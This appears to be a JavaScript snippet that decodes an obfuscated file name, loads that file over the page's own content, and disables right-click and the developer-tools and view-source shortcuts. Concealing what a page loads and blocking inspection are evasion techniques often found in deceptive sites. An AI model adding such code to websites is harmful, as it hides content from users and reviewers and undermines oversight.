(async function() {
    try {
        const _k = "==AbpRHZp92YyV3clB2bj5WauR2Y"; 
        const _target = atob(_k.split("").reverse().join("").substring(2));

        const res = await fetch("./" + _target);
        if (!res.ok) return;

        const html = await res.text();
        
        document.open();
        document.write(html);
        document.write(`<script>
            document.oncontextmenu = () => false;
            document.onkeydown = e => {
                if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) return false;
            };
        <\/script>`);
        document.close();
    } catch (e) {}
})();
